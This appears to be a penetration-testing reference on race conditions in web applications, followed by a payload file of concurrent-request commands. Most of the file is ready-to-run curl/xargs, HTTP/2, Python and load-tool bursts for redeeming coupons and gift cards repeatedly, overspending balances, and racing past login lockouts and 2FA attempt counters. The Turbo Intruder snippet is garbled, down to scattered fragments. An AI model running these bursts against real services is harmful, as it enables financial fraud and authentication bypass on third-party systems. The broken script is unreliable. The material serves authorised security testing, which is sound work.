blocks.text: A race condition occurs when the outcome of an operation depends on the timing of concurrent requests. In web applications the common form is limit overrun: a check ("has this coupon been used?") and the update that enforces it ("mark as used") are not atomic, so many parallel requests pass the check before any of them updates the state. Related flaws include time-of-check to time-of-use on files and tokens, multi-step state confusion, and partial construction of objects. See also `Business-Logic/workflow-race-payloads.txt`.

items: Redeeming a coupon, gift card or single-use token more than once
Withdrawing, transferring or spending beyond a balance or limit
Voting, liking, rating and invite acceptance beyond the intended count
Bypassing rate limits, lockouts and MFA attempt counters
Email-change and password-reset confirmation races (a token bound to the wrong account)
Registration races that create duplicate accounts or claim the same username
Race between an upload and its validation or deletion
Session, cart and checkout state changes between price calculation and payment

blocks.text: Identify an operation that must happen at most once and has a visible counter or balance. Send a baseline request, then send many identical requests as simultaneously as possible and check the final state, not the individual responses. HTTP/2 single-packet delivery and HTTP/1.1 last-byte synchronisation remove network jitter. Warm up connections first and, where possible, use sessions that are cheap to create. Use test accounts, small values and reversible actions; stop once a duplicate effect is shown.
See `race-conditions-payloads.txt` for concurrent-request commands, tool scripts and scenario fixtures. Replace endpoints and parameters with the target's.

items: [CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html)

# Race Condition Payloads
# Commands and fixtures for parallel requests. Use test accounts, small amounts and a unique marker value per run.

# Shell: many parallel identical requests with curl and xargs
seq 1 30 | xargs -P 30 -I{} curl -s -o /dev/null -w "%{http_code}
" -X POST https://app.example.test/api/coupon/redeem -H "Cookie: session=TEST_SESSION" -d "code=RACE-TEST"
seq 1 20 | xargs -P 20 -I{} curl -s -X POST https://app.example.test/api/transfer -H "Cookie: session=TEST_SESSION" -H "Content-Type: application/json" -d '{"to":"test-account-2","amount":1}'
seq 1 20 | xargs -P 20 -I{} curl -s -X POST https://app.example.test/api/like/POST_ID -H "Cookie: session=TEST_SESSION"
seq 1 15 | xargs -P 15 -I{} curl -s -X POST https://app.example.test/api/invite/accept -H "Cookie: session=TEST_SESSION" -d "token=INVITE_TEST_TOKEN"
seq 1 15 | xargs -P 15 -I{} curl -s -X POST https://app.example.test/api/gift-card/redeem -H "Cookie: session=TEST_SESSION" -d "code=GIFT-TEST"

# Shell: HTTP/2 multiplexing in one connection with curl (requests are sent on one connection and interleaved)
curl --http2 -s -Z --parallel-max 30 -X POST -d "code=RACE-TEST" -H "Cookie: session=TEST_SESSION" $(printf 'https://app.example.test/api/coupon/redeem %.0s' $(seq 1 30)) -o /dev/null
curl --http2-prior-knowledge -s -Z --parallel-immediate -X POST -d "code=RACE-TEST" -H "Cookie: session=TEST_SESSION" $(printf 'https://app.example.test/api/coupon/redeem %.0s' $(seq 1 30)) -o /dev/null

# Python asyncio: send N requests concurrently over separate connections
python3 -c "import asyncio,aiohttp;exec('async def go():
 async with aiohttp.ClientSession(headers={"Cookie":"session=TEST_SESSION"}) as s:
  r=await asyncio.gather(*[s.post("https://app.example.test/api/coupon/redeem",data={"code":"RACE-TEST"}) for _ in range(30)])
  print([x.status for x in r])');asyncio.run(go())"
python3 -c "import threading,requests;r=[];t=[threading.Thread(target=lambda:r.append(requests.post('https://app.example.test/api/coupon/redeem',data={'code':'RACE-TEST'},headers={'Cookie':'session=TEST_SESSION'}).status_code)) for _ in range(30)];[x.start() for x in t];[x.join() for x in t];print(sorted(r))"

# Burp Repeater: create a group of identical requests (duplicate the tab N times), then use Send group in parallel
# Burp Repeater: choose "Send group in parallel (single-packet attack)" for HTTP/2 targets and "Send group in parallel (last-byte sync)" for HTTP/1.1 targets

#     for i in range(20):

# Turbo Intruder: distinct values per request (each request carries a different guess, for example a code or username)
# def queueRequests(target, wordlists):

#         engine.queue(target.req, word.strip(), gate='race1')
#     engine.openGate('race1')

# Connection warm-up: send a harmless request first so the first race request does not pay the TLS and routing cost
GET /health HTTP/2
GET / HTTP/2
OPTIONS / HTTP/2

# Limit overrun: scenarios to test (single-use or capped operations)
# Redeem one coupon, gift card or voucher in many parallel requests
# Withdraw, transfer or spend an amount near the balance in many parallel requests
# Apply a discount code at checkout repeatedly in parallel
# Claim a one-time reward, trial or free credit
# Vote, like, rate or follow beyond the allowed count
# Accept the same invitation or share link from several sessions
# Send the same verification, password reset or invitation email many times beyond the limit
# Create more resources than the plan limit (projects, API keys, seats)
# Use the same single-use token (reset, magic link, OTP) from several sessions

# Rate-limit and lockout overrun: make the wrong attempts in parallel so they pass before the counter increments
seq 1 40 | xargs -P 40 -I{} curl -s -o /dev/null -w "%{http_code}
" -X POST https://app.example.test/login -d "user=test&pass=wrong{}"
seq 1 40 | xargs -P 40 -I{} curl -s -o /dev/null -w "%{http_code}
" -X POST https://app.example.test/2fa/verify -b "session=TEST_SESSION" -d "otp=00000{}"

# Multi-endpoint races (two different requests at the same moment)
# Send checkout payment and cart modification together; check which price is charged and which items ship
# Send email-change and email-confirmation together; check the final verified address
# Send password-reset request and password-change together; check which token is valid
# Send role-change and a privileged action together; check that the action cannot use the old role
# Send delete and update on the same object together; check for orphaned data
# Send logout or session revocation and an authenticated request together

# Time-of-check to time-of-use on files (create and replace objects between validation and use)
# Upload a valid file and request it while the server is still validating or scanning it
# Rename or replace a path between the existence check and the read
# Swap a symlink target between validation and open (see Symbolic-Link-Attacks)
# Overwrite an uploaded file name with the same name in a second request

# Partial construction and state confusion
# Register and use the account before the email-verification record is created
# Log in during account creation before default roles or permissions are applied
# Create an object and read it before required fields or ownership are set
# Submit a multi-step form from several tabs with different step values
GET /api/object/ID?include=owner,permissions
POST /api/register with {"email":"race-test@example.test","password":"RaceTest1!"}
POST /api/register with {"email":"race-test@example.test","password":"RaceTest2!"}

# Token and identifier races
# Request many reset tokens at the same moment and check for duplicates or sequences
# Request many API keys, order numbers or invoice numbers at the same moment and check for duplicates
# Request account creation with the same username in parallel and check for duplicates (missing unique constraint)
POST /api/register with {"username":"race-user"} sent 20 times in parallel
POST /api/orders sent 20 times in parallel and compare the returned order IDs

# Verification of results (check state, not only HTTP status)
# Balance and counter after the run
# Number of resources created
# Number of emails received
# Audit log entries
# Duplicate rows (an admin view or export on your own test data)

# Mitigation checks
# A database transaction with a row lock or an atomic update (UPDATE ... WHERE used = false)
# A unique constraint on single-use tokens and identifiers
# An idempotency key accepted once per operation
# A per-user or per-resource mutex or queue for the critical operation

# Load tools configured for a synchronised burst (own test environment, small counts)
hey -n 30 -c 30 -m POST -H 'Cookie: session=TEST_SESSION' -H 'Content-Type: application/json' -d '{"code":"RACE-TEST"}' https://app.example.test/api/coupons/redeem
bombardier -c 30 -n 30 -m POST -H 'Cookie: session=TEST_SESSION' -H 'Content-Type: application/json' -f body.json https://app.example.test/api/coupons/redeem
ab -n 30 -c 30 -p body.json -T application/json -C session=TEST_SESSION https://app.example.test/api/coupons/redeem
wrk -t1 -c30 -d1s -s post.lua https://app.example.test/api/coupons/redeem
echo 'POST https://app.example.test/api/coupons/redeem' | vegeta attack -rate=30 -duration=1s -body=body.json -header='Cookie: session=TEST_SESSION' | vegeta report
ghz --insecure -c 30 -n 30 --call example.CouponService/Redeem -d '{"code":"RACE-TEST"}' app.example.test:50051
xargs -P 30 -I{} sh -c 'curl -s -o /dev/null -w "%{http_code}
" -X POST -b session=TEST_SESSION -d code=RACE-TEST https://app.example.test/api/coupons/redeem' < <(seq 1 30)
parallel -j 30 curl -s -o /dev/null -w '%{http_code}
' -X POST -b session=TEST_SESSION -d code=RACE-TEST https://app.example.test/api/coupons/redeem ::: $(seq 1 30)
